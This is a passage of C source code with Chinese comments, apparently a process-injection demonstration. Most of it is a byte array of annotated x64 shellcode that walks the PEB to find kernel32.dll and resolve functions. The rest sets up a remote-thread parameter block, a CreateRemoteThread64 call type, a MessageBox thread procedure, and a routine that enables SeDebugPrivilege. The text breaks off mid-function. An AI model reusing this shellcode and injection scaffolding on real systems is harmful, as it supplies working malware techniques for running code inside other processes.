&quot;\\x48\\x83\\xec\\x38&quot;                                 /* sub rsp, 0x38                            */\n    /* 03DE */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 03E3 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 03E7 */ &quot;\\x48\\x8b\\x4c\\x24\\x48&quot;                             /* mov rcx, [rsp+0x48]                      */\n    /* 03EC */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 03F0 */ &quot;\\x88\\x44\\x24\\x22&quot;                                 /* mov [rsp+0x22], al                       */\n    /* 03F4 */ &quot;\\x0f\\xb6\\x4c\\x24\\x22&quot;                             /* movzx ecx, byte [rsp+0x22]               */\n    /* 03F9 */ &quot;\\xe8\\x52\\xff\\xff\\xff&quot;                             /* call 0x350                               */\n    /* 03FE */ &quot;\\x88\\x44\\x24\\x21&quot;                                 /* mov [rsp+0x21], al                       */\n    /* 0402 */ &quot;\\x48\\x8b\\x44\\x24\\x48&quot;                             /* mov rax, [rsp+0x48]                      */\n    /* 0407 */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 040B */ &quot;\\x48\\x89\\x44\\x24\\x48&quot;                             /* mov [rsp+0x48], rax                      */\n    /* 0410 */ &quot;\\x0f\\xbe\\x44\\x24\\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */\n    /* 0415 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0417 */ &quot;\\x75\\x07&quot;                                         /* jnz 0x420                                */\n    /* 0419 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 041E */ &quot;\\xeb\\x7c&quot;                                         /* jmp 0x49c                                */\n    /* 0420 */ &quot;\\x48\\x8b\\x4c\\x24\\x48&quot;                             /* mov rcx, [rsp+0x48]                      */\n    /* 0425 */ &quot;\\xe8\\x66\\xff\\xff\\xff&quot;                             /* call 0x390                               */\n    /* 042A */ &quot;\\x89\\x44\\x24\\x24&quot;                                 /* mov [rsp+0x24], eax                      */\n    /* 042E */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 0433 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 0437 */ &quot;\\x48\\x8b\\x4c\\x24\\x40&quot;                             /* mov rcx, [rsp+0x40]                      */\n    /* 043C */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 0440 */ &quot;\\x88\\x44\\x24\\x23&quot;                                 /* mov [rsp+0x23], al                       */\n    /* 0444 */ &quot;\\x0f\\xb6\\x4c\\x24\\x23&quot;                             /* movzx ecx, byte [rsp+0x23]               */\n    /* 0449 */ &quot;\\xe8\\x02\\xff\\xff\\xff&quot;                             /* call 0x350                               */\n    /* 044E */ &quot;\\x88\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], al                       */\n    /* 0452 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 0457 */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 045B */ &quot;\\x48\\x89\\x44\\x24\\x40&quot;                             /* mov [rsp+0x40], rax                      */\n    /* 0460 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 0465 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0467 */ &quot;\\x75\\x04&quot;                                         /* jnz 0x46d                                */\n    /* 0469 */ &quot;\\x33\\xc0&quot;                                         /* xor eax, eax                             */\n    /* 046B */ &quot;\\xeb\\x2f&quot;                                         /* jmp 0x49c                                */\n    /* 046D */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 0472 */ &quot;\\x0f\\xbe\\x4c\\x24\\x21&quot;                             /* movsx ecx, byte [rsp+0x21]               */\n    /* 0477 */ &quot;\\x3b\\xc1&quot;                                         /* cmp eax, ecx                             */\n    /* 0479 */ &quot;\\x75\\xb3&quot;                                         /* jnz 0x42e                                */\n    /* 047B */ &quot;\\x44\\x8b\\x44\\x24\\x24&quot;                             /* mov r8d, [rsp+0x24]                      */\n    /* 0480 */ &quot;\\x48\\x8b\\x54\\x24\\x48&quot;                             /* mov rdx, [rsp+0x48]                      */\n    /* 0485 */ &quot;\\x48\\x8b\\x4c\\x24\\x40&quot;                             /* mov rcx, [rsp+0x40]                      */\n    /* 048A */ &quot;\\xe8\\x21\\x00\\x00\\x00&quot;                             /* call 0x4b0                               */\n    /* 048F */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0491 */ &quot;\\x75\\x9b&quot;                                         /* jnz 0x42e                                */\n    /* 0493 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 0498 */ &quot;\\x48\\x83\\xe8\\x02&quot;                                 /* sub rax, 0x2                             */\n    /* 049C */ &quot;\\x48\\x83\\xc4\\x38&quot;                                 /* add rsp, 0x38                            */\n    /* 04A0 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 04A1 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A2 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A3 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AD */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AF */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04B0 */ &quot;\\x44\\x89\\x44\\x24\\x18&quot;                             /* mov [rsp+0x18], r8d                      */\n    /* 04B5 */ &quot;\\x48\\x89\\x54\\x24\\x10&quot;                             /* mov [rsp+0x10], rdx                      */\n    /* 04BA */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 04BF */ &quot;\\x48\\x83\\xec\\x38&quot;                                 /* sub rsp, 0x38                            */\n    /* 04C3 */ &quot;\\x8b\\x44\\x24\\x50&quot;                                 /* mov eax, [rsp+0x50]                      */\n    /* 04C7 */ &quot;\\xff\\xc8&quot;                                         /* dec eax                                  */\n    /* 04C9 */ &quot;\\x89\\x44\\x24\\x50&quot;                                 /* mov [rsp+0x50], eax                      */\n    /* 04CD */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 04D2 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 04D6 */ &quot;\\x48\\x8b\\x4c\\x24\\x40&quot;                             /* mov rcx, [rsp+0x40]                      */\n    /* 04DB */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 04DF */ &quot;\\x88\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], al                       */\n    /* 04E3 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 04E8 */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 04EC */ &quot;\\x48\\x89\\x44\\x24\\x40&quot;                             /* mov [rsp+0x40], rax                      */\n    /* 04F1 */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 04F6 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 04FA */ &quot;\\x48\\x8b\\x4c\\x24\\x48&quot;                             /* mov rcx, [rsp+0x48]                      */\n    /* 04FF */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 0503 */ &quot;\\x88\\x44\\x24\\x21&quot;                                 /* mov [rsp+0x21], al                       */\n    /* 0507 */ &quot;\\x48\\x8b\\x44\\x24\\x48&quot;                             /* mov rax, [rsp+0x48]                      */\n    /* 050C */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 0510 */ &quot;\\x48\\x89\\x44\\x24\\x48&quot;                             /* mov [rsp+0x48], rax                      */\n    /* 0515 */ &quot;\\x0f\\xb6\\x4c\\x24\\x20&quot;                             /* movzx ecx, byte [rsp+0x20]               */\n    /* 051A */ &quot;\\xe8\\x31\\xfe\\xff\\xff&quot;                             /* call 0x350                               */\n    /* 051F */ &quot;\\x0f\\xbe\\xc0&quot;                                     /* movsx eax, al                            */\n    /* 0522 */ &quot;\\x89\\x44\\x24\\x28&quot;                                 /* mov [rsp+0x28], eax                      */\n    /* 0526 */ &quot;\\x0f\\xb6\\x4c\\x24\\x21&quot;                             /* movzx ecx, byte [rsp+0x21]               */\n    /* 052B */ &quot;\\xe8\\x20\\xfe\\xff\\xff&quot;                             /* call 0x350                               */\n    /* 0530 */ &quot;\\x0f\\xbe\\xc0&quot;                                     /* movsx eax, al                            */\n    /* 0533 */ &quot;\\x8b\\x4c\\x24\\x28&quot;                                 /* mov ecx, [rsp+0x28]                      */\n    /* 0537 */ &quot;\\x2b\\xc8&quot;                                         /* sub ecx, eax                             */\n    /* 0539 */ &quot;\\x8b\\xc1&quot;                                         /* mov eax, ecx                             */\n    /* 053B */ &quot;\\x89\\x44\\x24\\x24&quot;                                 /* mov [rsp+0x24], eax                      */\n    /* 053F */ &quot;\\x83\\x7c\\x24\\x24\\x00&quot;                             /* cmp dword [rsp+0x24], 0x0                */\n    /* 0544 */ &quot;\\x75\\x1d&quot;                                         /* jnz 0x563                                */\n    /* 0546 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 054B */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 054D */ &quot;\\x74\\x14&quot;                                         /* jz 0x563                                 */\n    /* 054F */ &quot;\\x0f\\xbe\\x44\\x24\\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */\n    /* 0554 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0556 */ &quot;\\x74\\x0b&quot;                                         /* jz 0x563                                 */\n    /* 0558 */ &quot;\\x83\\x7c\\x24\\x50\\x00&quot;                             /* cmp dword [rsp+0x50], 0x0                */\n    /* 055D */ &quot;\\x0f\\x87\\x60\\xff\\xff\\xff&quot;                         /* ja 0x4c3                                 */\n    /* 0563 */ &quot;\\x8b\\x44\\x24\\x24&quot;                                 /* mov eax, [rsp+0x24]                      */\n    /* 0567 */ &quot;\\x48\\x83\\xc4\\x38&quot;                                 /* add rsp, 0x38                            */\n    /* 056B */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 056C */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 056D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 056E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 056F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0570 */ &quot;\\x44\\x89\\x44\\x24\\x18&quot;                             /* mov [rsp+0x18], r8d                      */\n    /* 0575 */ &quot;\\x48\\x89\\x54\\x24\\x10&quot;                             /* mov [rsp+0x10], rdx                      */\n    /* 057A */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 057F */ &quot;\\x48\\x83\\xec\\x28&quot;                                 /* sub rsp, 0x28                            */\n    /* 0583 */ &quot;\\x48\\x8b\\x44\\x24\\x38&quot;                             /* mov rax, [rsp+0x38]                      */\n    /* 0588 */ &quot;\\x48\\x89\\x44\\x24\\x10&quot;                             /* mov [rsp+0x10], rax                      */\n    /* 058D */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 0592 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 0597 */ &quot;\\x8b\\x44\\x24\\x40&quot;                                 /* mov eax, [rsp+0x40]                      */\n    /* 059B */ &quot;\\x89\\x04\\x24&quot;                                     /* mov [rsp], eax                           */\n    /* 059E */ &quot;\\x8b\\x44\\x24\\x40&quot;                                 /* mov eax, [rsp+0x40]                      */\n    /* 05A2 */ &quot;\\xff\\xc8&quot;                                         /* dec eax                                  */\n    /* 05A4 */ &quot;\\x89\\x44\\x24\\x40&quot;                                 /* mov [rsp+0x40], eax                      */\n    /* 05A8 */ &quot;\\x83\\x3c\\x24\\x00&quot;                                 /* cmp dword [rsp], 0x0                     */\n    /* 05AC */ &quot;\\x74\\x2b&quot;                                         /* jz 0x5d9                                 */\n    /* 05AE */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 05B3 */ &quot;\\x48\\x8b\\x4c\\x24\\x10&quot;                             /* mov rcx, [rsp+0x10]                      */\n    /* 05B8 */ &quot;\\x0f\\xb6\\x09&quot;                                     /* movzx ecx, byte [rcx]                    */\n    /* 05BB */ &quot;\\x88\\x08&quot;                                         /* mov [rax], cl                            */\n    /* 05BD */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 05C2 */ &quot;\\x48\\xff\\xc0&quot;                                     /* inc rax                                  */\n    /* 05C5 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 05CA */ &quot;\\x48\\x8b\\x44\\x24\\x10&quot;                             /* mov rax, [rsp+0x10]                      */\n    /* 05CF */ &quot;\\x48\\xff\\xc0&quot;                                     /* inc rax                                  */\n    /* 05D2 */ &quot;\\x48\\x89\\x44\\x24\\x10&quot;                             /* mov [rsp+0x10], rax                      */\n    /* 05D7 */ &quot;\\xeb\\xbe&quot;                                         /* jmp 0x597                                */\n    /* 05D9 */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 05DE */ &quot;\\x48\\x83\\xc4\\x28&quot;                                 /* add rsp, 0x28                            */\n    /* 05E2 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 05E3 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05ED */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EF */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05F0 */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 05F5 */ &quot;\\x48\\x83\\xec\\x18&quot;                                 /* sub rsp, 0x18                            */\n    /* 05F9 */ &quot;\\xc7\\x04\\x24\\x00\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x0                     */\n    /* 0600 */ &quot;\\x48\\x8b\\x44\\x24\\x20&quot;                             /* mov rax, [rsp+0x20]                      */\n    /* 0605 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 060A */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 060D */ &quot;\\xc1\\xe0\\x07&quot;                                     /* shl eax, 0x7                             */\n    /* 0610 */ &quot;\\x8b\\x0c\\x24&quot;                                     /* mov ecx, [rsp]                           */\n    /* 0613 */ &quot;\\xc1\\xe9\\x19&quot;                                     /* shr ecx, 0x19                            */\n    /* 0616 */ &quot;\\x03\\xc1&quot;                                         /* add eax, ecx                             */\n    /* 0618 */ &quot;\\x48\\x8b\\x4c\\x24\\x08&quot;                             /* mov rcx, [rsp+0x8]                       */\n    /* 061D */ &quot;\\x0f\\xb6\\x09&quot;                                     /* movzx ecx, byte [rcx]                    */\n    /* 0620 */ &quot;\\x03\\xc1&quot;                                         /* add eax, ecx                             */\n    /* 0622 */ &quot;\\x89\\x04\\x24&quot;                                     /* mov [rsp], eax                           */\n    /* 0625 */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 062A */ &quot;\\x0f\\xb6\\x00&quot;                                     /* movzx eax, byte [rax]                    */\n    /* 062D */ &quot;\\x89\\x44\\x24\\x04&quot;                                 /* mov [rsp+0x4], eax                       */\n    /* 0631 */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 0636 */ &quot;\\x48\\xff\\xc0&quot;                                     /* inc rax                                  */\n    /* 0639 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 063E */ &quot;\\x83\\x7c\\x24\\x04\\x00&quot;                             /* cmp dword [rsp+0x4], 0x0                 */\n    /* 0643 */ &quot;\\x75\\xc5&quot;                                         /* jnz 0x60a                                */\n    /* 0645 */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 0648 */ &quot;\\x48\\x83\\xc4\\x18&quot;                                 /* add rsp, 0x18                            */\n    /* 064C */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 064D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 064E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 064F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0650 */ &quot;\\x48\\x81\\xec\\x88\\x02\\x00\\x00&quot;                     /* sub rsp, 0x288                           */\n    /* 0657 */ &quot;\\x48\\xc7\\x44\\x24\\x60\\xff\\xff\\xff\\xff&quot;             /* mov qword [rsp+0x60], 0xffffffffffffffff */\n    /* 0660 */ &quot;\\x65\\x48\\x8b\\x04\\x25\\x60\\x00\\x00\\x00&quot;             /* mov rax, [gs:0x60]                       */\n    /* 0669 */ &quot;\\x48\\x89\\x44\\x24\\x68&quot;                             /* mov [rsp+0x68], rax                      */\n    /* 066E */ &quot;\\x48\\x8b\\x44\\x24\\x68&quot;                             /* mov rax, [rsp+0x68]                      */\n    /* 0673 */ &quot;\\x48\\x8b\\x40\\x18&quot;                                 /* mov rax, [rax+0x18]                      */\n    /* 0677 */ &quot;\\x48\\x83\\xc0\\x20&quot;                                 /* add rax, 0x20                            */\n    /* 067B */ &quot;\\x48\\x89\\x44\\x24\\x58&quot;                             /* mov [rsp+0x58], rax                      */\n    /* 0680 */ &quot;\\x48\\x8b\\x44\\x24\\x58&quot;                             /* mov rax, [rsp+0x58]                      */\n    /* 0685 */ &quot;\\x48\\x8b\\x00&quot;                                     /* mov rax, [rax]                           */\n    /* 0688 */ &quot;\\x48\\x89\\x44\\x24\\x30&quot;                             /* mov [rsp+0x30], rax                      */\n    /* 068D */ &quot;\\xb8\\x6b\\x00\\x00\\x00&quot;                             /* mov eax, 0x6b                            */\n    /* 0692 */ &quot;\\x66\\x89\\x44\\x24\\x38&quot;                             /* mov [rsp+0x38], ax                       */\n    /* 0697 */ &quot;\\xb8\\x65\\x00\\x00\\x00&quot;                             /* mov eax, 0x65                            */\n    /* 069C */ &quot;\\x66\\x89\\x44\\x24\\x3a&quot;                             /* mov [rsp+0x3a], ax                       */\n    /* 06A1 */ &quot;\\xb8\\x72\\x00\\x00\\x00&quot;                             /* mov eax, 0x72                            */\n    /* 06A6 */ &quot;\\x66\\x89\\x44\\x24\\x3c&quot;                             /* mov [rsp+0x3c], ax                       */\n    /* 06AB */ &quot;\\xb8\\x6e\\x00\\x00\\x00&quot;                             /* mov eax, 0x6e                            */\n    /* 06B0 */ &quot;\\x66\\x89\\x44\\x24\\x3e&quot;                             /* mov [rsp+0x3e], ax                       */\n    /* 06B5 */ &quot;\\xb8\\x65\\x00\\x00\\x00&quot;                             /* mov eax, 0x65                            */\n    /* 06BA */ &quot;\\x66\\x89\\x44\\x24\\x40&quot;                             /* mov [rsp+0x40], ax                       */\n    /* 06BF */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 06C4 */ &quot;\\x66\\x89\\x44\\x24\\x42&quot;                             /* mov [rsp+0x42], ax                       */\n    /* 06C9 */ &quot;\\xb8\\x33\\x00\\x00\\x00&quot;                             /* mov eax, 0x33                            */\n    /* 06CE */ &quot;\\x66\\x89\\x44\\x24\\x44&quot;                             /* mov [rsp+0x44], ax                       */\n    /* 06D3 */ &quot;\\xb8\\x32\\x00\\x00\\x00&quot;                             /* mov eax, 0x32                            */\n    /* 06D8 */ &quot;\\x66\\x89\\x44\\x24\\x46&quot;                             /* mov [rsp+0x46], ax                       */\n    /* 06DD */ &quot;\\xb8\\x2e\\x00\\x00\\x00&quot;                             /* mov eax, 0x2e                            */\n    /* 06E2 */ &quot;\\x66\\x89\\x44\\x24\\x48&quot;                             /* mov [rsp+0x48], ax                       */\n    /* 06E7 */ &quot;\\xb8\\x64\\x00\\x00\\x00&quot;                             /* mov eax, 0x64                            */\n    /* 06EC */ &quot;\\x66\\x89\\x44\\x24\\x4a&quot;                             /* mov [rsp+0x4a], ax                       */\n    /* 06F1 */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 06F6 */ &quot;\\x66\\x89\\x44\\x24\\x4c&quot;                             /* mov [rsp+0x4c], ax                       */\n    /* 06FB */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 0700 */ &quot;\\x66\\x89\\x44\\x24\\x4e&quot;                             /* mov [rsp+0x4e], ax                       */\n    /* 0705 */ &quot;\\x33\\xc0&quot;                                         /* xor eax, eax                             */\n    /* 0707 */ &quot;\\x66\\x89\\x44\\x24\\x50&quot;                             /* mov [rsp+0x50], ax                       */\n    /* 070C */ &quot;\\x48\\x8b\\x44\\x24\\x58&quot;                             /* mov rax, [rsp+0x58]                      */\n    /* 0711 */ &quot;\\x48\\x39\\x44\\x24\\x30&quot;                             /* cmp [rsp+0x30], rax                      */\n    /* 0716 */ &quot;\\x0f\\x84\\x8b\\x00\\x00\\x00&quot;                         /* jz 0x7a7                                 */\n    /* 071C */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 0721 */ &quot;\\x48\\x83\\xe8\\x10&quot;                                 /* sub rax, 0x10                            */\n    /* 0725 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot;                             /* mov [rsp+0x28], rax                      */\n    /* 072A */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 072F */ &quot;\\x0f\\xb7\\x40\\x48&quot;                                 /* movzx eax, word [rax+0x48]               */\n    /* 0733 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0735 */ &quot;\\x74\\x5e&quot;                                         /* jz 0x795                                 */\n    /* 0737 */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 073C */ &quot;\\x0f\\xb7\\x40\\x48&quot;                                 /* movzx eax, word [rax+0x48]               */\n    /* 0740 */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 0744 */ &quot;\\x44\\x8b\\x44\\x24\\x20&quot;                             /* mov r8d, [rsp+0x20]                      */\n    /* 0749 */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 074E */ &quot;\\x48\\x8b\\x50\\x50&quot;                                 /* mov rdx, [rax+0x50]                      */\n    /* 0752 */ &quot;\\x48\\x8d\\x4c\\x24\\x70&quot;                             /* lea rcx, [rsp+0x70]                      */\n    /* 0757 */ &quot;\\xe8\\x14\\xfe\\xff\\xff&quot;                             /* call 0x570                               */\n    /* 075C */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 0760 */ &quot;\\x33\\xd2&quot;                                         /* xor edx, edx                             */\n    /* 0762 */ &quot;\\xb9\\x02\\x00\\x00\\x00&quot;                             /* mov ecx, 0x2                             */\n    /* 0767 */ &quot;\\x48\\xf7\\xf1&quot;                                     /* div rcx                                  */\n    /* 076A */ &quot;\\x33\\xc9&quot;                                         /* xor ecx, ecx                             */\n    /* 076C */ &quot;\\x66\\x89\\x4c\\x44\\x70&quot;                             /* mov [rsp+rax*2+0x70], cx                 */\n    /* 0771 */ &quot;\\x48\\x8d\\x54\\x24\\x38&quot;                             /* lea rdx, [rsp+0x38]                      */\n    /* 0776 */ &quot;\\x48\\x8d\\x4c\\x24\\x70&quot;                             /* lea rcx, [rsp+0x70]                      */\n    /* 077B */ &quot;\\xe8\\x50\\xfc\\xff\\xff&quot;                             /* call 0x3d0                               */\n    /* 0780 */ &quot;\\x48\\x85\\xc0&quot;                                     /* test rax, rax                            */\n    /* 0783 */ &quot;\\x74\\x10&quot;                                         /* jz 0x795                                 */\n    /* 0785 */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 078A */ &quot;\\x48\\x8b\\x40\\x30&quot;                                 /* mov rax, [rax+0x30]                      */\n    /* 078E */ &quot;\\x48\\x89\\x44\\x24\\x60&quot;                             /* mov [rsp+0x60], rax                      */\n    /* 0793 */ &quot;\\xeb\\x12&quot;                                         /* jmp 0x7a7                                */\n    /* 0795 */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 079A */ &quot;\\x48\\x8b\\x00&quot;                                     /* mov rax, [rax]                           */\n    /* 079D */ &quot;\\x48\\x89\\x44\\x24\\x30&quot;                             /* mov [rsp+0x30], rax                      */\n    /* 07A2 */ &quot;\\xe9\\x65\\xff\\xff\\xff&quot;                             /* jmp 0x70c                                */\n    /* 07A7 */ &quot;\\x48\\x8b\\x44\\x24\\x60&quot;                             /* mov rax, [rsp+0x60]                      */\n    /* 07AC */ &quot;\\x48\\x81\\xc4\\x88\\x02\\x00\\x00&quot;                     /* add rsp, 0x288                           */\n    /* 07B3 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 07B4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BD */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BF */ &quot;\\xcc&quot;                                             /* int3                                     */\n};\ntypedef struct _RemoteParam {\n    char szMsg[12];    //MessageBox函数中显示的字符提示  \n    DWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\ntypedef VOID(*pCreateRemoteThread64) (HANDLE hProcess,\n    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,\n    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,\n    DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);\n//定义MessageBox类型的函数指针\ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n    RemoteParam* pRP = (RemoteParam*)lParam;\n    PFN_MESSAGEBOX pfnMessageBox;\n    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;\n    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);\n    return 0;\n}\nbool enableDebugPriv()\n{\n    HANDLE hToken;\n    LUID sedebugnameValue;\n    TOKEN_PRIVILEGES tkp;\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {\n        return false;\n    }\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {\n        